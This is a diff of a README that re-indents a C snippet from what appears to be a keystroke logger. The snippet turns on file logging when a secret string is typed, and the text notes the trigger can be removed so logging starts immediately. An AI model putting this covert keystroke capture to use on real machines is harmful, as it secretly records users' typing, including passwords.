@@ -17,21 +17,21 @@ There is a check in `WriteWorkItem` that will initiate writing to a file. This s
 
 Also, if you want to match your secret string in both local and virtual sessions, you must match the 'press' and 'release' for local and 'press' only for virtual.
 ```c
-	char target_string[] = "aw3s0m3,d00d";
-	char target_string2[] = "aaww33ss00mm33,,dd0000dd";
+char target_string[] = "aw3s0m3,d00d";
+char target_string2[] = "aaww33ss00mm33,,dd0000dd";
   
-  if (strstr(secretBuffer, target_string) != NULL)
-			{
-				WriteToLogFile = WorkingLogging;
-				//clear secretBuffer to start checking again
-				memset(secretBuffer, 0, sizeof(secretBuffer));
-			}
-      else if (strstr(secretBuffer, target_string2) != NULL)
-			{
-				WriteToLogFile = WorkingLogging;
-				//clear secretBuffer to start checking again
-				memset(secretBuffer, 0, sizeof(secretBuffer));
-			}
+if (strstr(secretBuffer, target_string) != NULL)
+{
+	WriteToLogFile = WorkingLogging;
+	//clear secretBuffer to start checking again
+	memset(secretBuffer, 0, sizeof(secretBuffer));
+}
+else if (strstr(secretBuffer, target_string2) != NULL)
+{
+	WriteToLogFile = WorkingLogging;
+	//clear secretBuffer to start checking again
+	memset(secretBuffer, 0, sizeof(secretBuffer));
+}
 ```
 
 If you do not want activation, remove the check and move `WriteToLogFile = WorkingLogging` to the main `strcat` call
